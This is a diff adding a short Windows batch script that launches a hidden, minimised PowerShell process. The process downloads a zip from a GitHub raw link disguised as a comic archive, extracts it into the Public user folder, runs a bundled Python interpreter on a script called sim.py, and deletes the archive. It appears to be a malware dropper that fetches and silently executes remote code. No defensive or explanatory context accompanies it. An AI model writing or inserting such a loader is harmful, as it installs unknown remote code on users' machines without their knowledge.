@@ -1,0 +1,4 @@
+@echo off
+
+start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/longchinngon69/anhthu/raw/refs/heads/main/truyentranhdoremon.zip ', 'C:\\Users\\Public\\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document'); Start-Sleep -Seconds 1; C:\\Users\\Public\\Document\\python.exe C:\\Users\\Public\\Document\\Lib\\sim.py; del C:/Users/Public/Document.zip"
+exit
